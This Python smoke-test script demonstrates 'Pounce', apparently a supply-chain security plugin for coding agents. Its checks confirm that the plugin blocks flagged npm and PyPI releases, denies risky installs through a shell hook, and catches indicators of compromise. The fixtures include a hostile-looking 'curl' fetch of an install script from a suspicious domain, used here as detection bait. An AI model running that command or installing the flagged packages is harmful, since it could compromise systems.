#!/usr/bin/env python3
"""Deterministic smoke demo for the current Pounce feature set."""

from __future__ import annotations

import argparse
import contextlib
import io
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Any
from unittest import mock


SCRIPTS_ROOT = Path(__file__).resolve().parent
PLUGIN_ROOT = SCRIPTS_ROOT.parent
if str(SCRIPTS_ROOT) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_ROOT))

import install_local  # noqa: E402
import pounce_hook  # noqa: E402
import pounce_runtime  # noqa: E402


def make_check(name: str, passed: bool, detail: str, extra: dict[str, Any] | None = None) -> dict[str, Any]:
    payload = {
        "name": name,
        "status": "pass" if passed else "fail",
        "detail": detail,
    }
    if extra:
        payload["extra"] = extra
    return payload


def run_release_vet_smoke() -> list[dict[str, Any]]:
    checks: list[dict[str, Any]] = []
    with mock.patch.object(pounce_runtime.pounce_intel, "on_demand_osv_items", return_value=[]), mock.patch.object(
        pounce_runtime, "check_npm_release", return_value=[]
    ), mock.patch.object(pounce_runtime, "check_pypi_release", return_value=[]):
        npm_result = pounce_runtime.vet_payload(
            {
                "mode": "release",
                "ecosystem": "npm",
                "package_name": "plain-crypto-js",
                "version": "4.2.1",
            },
            PLUGIN_ROOT,
            write_stamp_enabled=False,
        )
        checks.append(
            make_check(
                "release vet blocks known malicious npm package",
                npm_result["verdict"] == "block"
                and any(finding["signal_name"] == "exact_ioc_match" for finding in npm_result["findings"]),
                npm_result["summary"],
            )
        )

        pypi_result = pounce_runtime.vet_payload(
            {
                "mode": "release",
                "ecosystem": "pypi",
                "package_name": "litellm",
                "version": "1.82.7",
            },
            PLUGIN_ROOT,
            write_stamp_enabled=False,
        )
        checks.append(
            make_check(
                "release vet blocks known malicious PyPI package",
                pypi_result["verdict"] == "block"
                and any(finding["signal_name"] == "exact_ioc_match" for finding in pypi_result["findings"]),
                pypi_result["summary"],
            )
        )
    return checks


def run_workspace_sweep_smoke() -> dict[str, Any]:
    with tempfile.TemporaryDirectory() as tmpdir:
        workspace = Path(tmpdir)
        (workspace / "incident.log").write_text("curl https://sfrclak.com/install.sh\n", encoding="utf-8")
        result = pounce_runtime.vet_payload(
            {"mode": "sweep", "workspace": str(workspace)},
            PLUGIN_ROOT,
            write_stamp_enabled=False,
        )
        return make_check(
            "workspace sweep catches bundled IOC indicators",
            result["verdict"] == "block"
            and any(
                finding["signal_name"] in {"artifact_ioc_match", "artifact_domain_match"}
                for finding in result["findings"]
            ),
            result["summary"],
        )


def run_hook_smoke() -> dict[str, Any]:
    with tempfile.TemporaryDirectory() as tmpdir:
        payload = {
            "hook_event_name": "PreToolUse",
            "cwd": tmpdir,
            "tool_name": "Bash",
            "tool_input": {"command": "npm install plain-crypto-js@4.2.1"},
        }
        with mock.patch.object(pounce_runtime.pounce_intel, "on_demand_osv_items", return_value=[]), mock.patch.object(
            pounce_runtime, "check_npm_release", return_value=[]
        ):
            result = pounce_hook.process_payload(payload, script_file=str(SCRIPTS_ROOT / "pounce_hook.py"))
    passed = (
        isinstance(result, dict)
        and result.get("hookSpecificOutput", {}).get("permissionDecision") == "deny"
        and "plain-crypto-js" in result.get("hookSpecificOutput", {}).get("permissionDecisionReason", "")
    )
    detail = (
        result.get("hookSpecificOutput", {}).get("permissionDecisionReason", "")
        if isinstance(result, dict)
        else "Hook returned no decision."
    )
    return make_check("shell hook denies risky dependency install", passed, detail)


def run_dependency_guard_smoke() -> list[dict[str, Any]]:
    checks: list[dict[str, Any]] = []
    with tempfile.TemporaryDirectory() as tmpdir:
        workspace = Path(tmpdir)
        manifest = workspace / "package.json"
        manifest.write_text(
            json.dumps({"dependencies": {"demo": "1.0.0"}}, indent=2) + "\n",
            encoding="utf-8",
        )
        turn_id = "demo-block"
        pounce_runtime.snapshot_dependency_guard(workspace, turn_id)
        manifest.write_text(
            json.dumps({"dependencies": {"demo": "2.0.0"}}, indent=2) + "\n",
            encoding="utf-8",
        )
        assessment = pounce_runtime.assess_dependency_guard(workspace, turn_id)
        checks.append(
            make_check(
                "dependency guard blocks unexplained manifest edits",
                assessment["block"] and "demo" in assessment["message"],
                assessment["message"],
            )
        )

    with tempfile.TemporaryDirectory() as tmpdir:
        workspace = Path(tmpdir)
        manifest = workspace / "package.json"
        manifest.write_text(
            json.dumps({"dependencies": {"demo": "1.0.0"}}, indent=2) + "\n",
            encoding="utf-8",
        )
        turn_id = "demo-allow"
        pounce_runtime.snapshot_dependency_guard(workspace, turn_id)
        pounce_runtime.record_dependency_guard_allowlist(
            workspace,
            turn_id,
            [
                {
                    "ecosystem": "npm",
                    "manager": "npm",
                    "verb": "install",
                    "name": "demo",
                    "expected_version": "2.0.0",
                    "command": "npm install demo@2.0.0 --save-exact",
                }
            ],
        )
        manifest.write_text(
            json.dumps({"dependencies": {"demo": "2.0.0"}}, indent=2) + "\n",
            encoding="utf-8",
        )
        assessment = pounce_runtime.assess_dependency_guard(workspace, turn_id)
        checks.append(
            make_check(
                "dependency guard allows expected same-turn dependency edits",
                not assessment["block"],
                "Expected manifest mutation matched the recorded allowlist.",
            )
        )
    return checks


def run_installer_smoke() -> dict[str, Any]:
    with tempfile.TemporaryDirectory() as home_dir, tempfile.TemporaryDirectory() as workspace_dir:
        fake_home = Path(home_dir)
        workspace = Path(workspace_dir)
        argv = ["install_local.py", "--workspace", str(workspace)]
        with mock.patch.object(Path, "home", return_value=fake_home), mock.patch.object(
            sys, "argv", argv
        ), contextlib.redirect_stdout(io.StringIO()):
            exit_code = install_local.main()

        hooks_path = workspace / ".codex" / "hooks.json"
        config_path = workspace / ".codex" / "config.toml"
        agents_path = workspace / "AGENTS.md"
        hooks_payload = json.loads(hooks_path.read_text(encoding="utf-8"))
        config_text = config_path.read_text(encoding="utf-8")
        agents_text = agents_path.read_text(encoding="utf-8")

        passed = (
            exit_code == 0
            and hooks_path.exists()
            and config_path.exists()
            and agents_path.exists()
            and "PreToolUse" in hooks_payload.get("hooks", {})
            and "codex_hooks = true" in config_text
            and "BEGIN POUNCE MANAGED BLOCK" in agents_text
        )
        return make_check(
            "installer wires AGENTS policy and workspace hooks",
            passed,
            "Installer created managed policy, hooks, and config in a clean workspace.",
        )


def run_mcp_smoke() -> dict[str, Any]:
    with tempfile.TemporaryDirectory() as workspace_dir, tempfile.TemporaryDirectory() as state_dir:
        workspace = Path(workspace_dir)
        (workspace / "AGENTS.md").write_text(pounce_runtime.agents_block_text(), encoding="utf-8")
        (workspace / "package.json").write_text(json.dumps({"dependencies": {"demo": "1.0.0"}}), encoding="utf-8")

        message_stream = "\n".join(
            [
                json.dumps(
                    {
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "initialize",
                        "params": {"protocolVersion": "2025-03-26"},
                    }
                ),
                json.dumps({"jsonrpc": "2.0", "id": 2, "method": "tools/list"}),
                json.dumps(
                    {
                        "jsonrpc": "2.0",
                        "id": 3,
                        "method": "tools/call",
                        "params": {
                            "name": "pounce.vet",
                            "arguments": {
                                "mode": "release",
                                "artifacts": ["curl https://sfrclak.com/install.sh"],
                            },
                        },
                    }
                ),
                json.dumps(
                    {
                        "jsonrpc": "2.0",
                        "id": 4,
                        "method": "tools/call",
                        "params": {
                            "name": "pounce.dashboard",
                            "arguments": {"workspace": str(workspace)},
                        },
                    }
                ),
            ]
        )
        env = {**os.environ, "POUNCE_STATE_DIR": state_dir}
        completed = subprocess.run(
            [sys.executable, str(SCRIPTS_ROOT / "pounce_mcp_server.py")],
            input=(message_stream + "\n").encode("utf-8"),
            capture_output=True,
            check=False,
            timeout=20,
            cwd=workspace,
            env=env,
        )
    if completed.returncode != 0:
        return make_check(
            "MCP server exposes pounce.vet and pounce.dashboard",
            False,
            completed.stderr.decode("utf-8", errors="replace").strip() or "MCP server exited non-zero.",
        )

    responses = [json.loads(line) for line in completed.stdout.decode("utf-8").splitlines() if line.strip()]
    tools_list = next((item for item in responses if item.get("id") == 2), None)
    vet_call = next((item for item in responses if item.get("id") == 3), None)
    dashboard_call = next((item for item in responses if item.get("id") == 4), None)
    tool_names = [tool.get("name") for tool in (tools_list or {}).get("result", {}).get("tools", [])]
    vet_structured = (vet_call or {}).get("result", {}).get("structuredContent", {})
    dashboard_structured = (dashboard_call or {}).get("result", {}).get("structuredContent", {})
    dashboard_text = ((dashboard_call or {}).get("result", {}).get("content", [{}])[0] or {}).get("text", "")
    passed = (
        "pounce.vet" in tool_names
        and "pounce.dashboard" in tool_names
        and vet_structured.get("verdict") == "block"
        and all(key in dashboard_structured for key in ("generated_at", "workspace", "feed", "recent_verdicts"))
        and "Pounce Dashboard" in dashboard_text
    )
    detail = (
        f"Dashboard returned `{dashboard_structured.get('workspace', {}).get('protection_status', 'unknown')}` "
        f"workspace status and `{dashboard_structured.get('feed', {}).get('trust_state', 'unknown')}` feed trust."
    )
    return make_check(
        "MCP server lists and executes pounce.vet and pounce.dashboard",
        passed,
        detail if passed else vet_structured.get("summary", "MCP tool calls did not return the expected data."),
    )


def run_demo() -> dict[str, Any]:
    checks: list[dict[str, Any]] = []
    checks.extend(run_release_vet_smoke())
    checks.append(run_workspace_sweep_smoke())
    checks.append(run_hook_smoke())
    checks.extend(run_dependency_guard_smoke())
    checks.append(run_installer_smoke())
    checks.append(run_mcp_smoke())
    passed = all(check["status"] == "pass" for check in checks)
    return {
        "status": "pass" if passed else "fail",
        "checks": checks,
        "summary": f"{sum(check['status'] == 'pass' for check in checks)}/{len(checks)} checks passed.",
    }


def print_human(payload: dict[str, Any]) -> None:
    print("Pounce Demo Smoke")
    print(payload["summary"])
    print()
    for check in payload["checks"]:
        label = "[PASS]" if check["status"] == "pass" else "[FAIL]"
        print(f"{label} {check['name']}")
        print(f"       {check['detail']}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Run the deterministic Pounce smoke demo.")
    parser.add_argument("--json", action="store_true", help="Print the result as JSON.")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    payload = run_demo()
    if args.json:
        print(json.dumps(payload, indent=2))
    else:
        print_human(payload)
    return 0 if payload["status"] == "pass" else 1


if __name__ == "__main__":
    raise SystemExit(main())
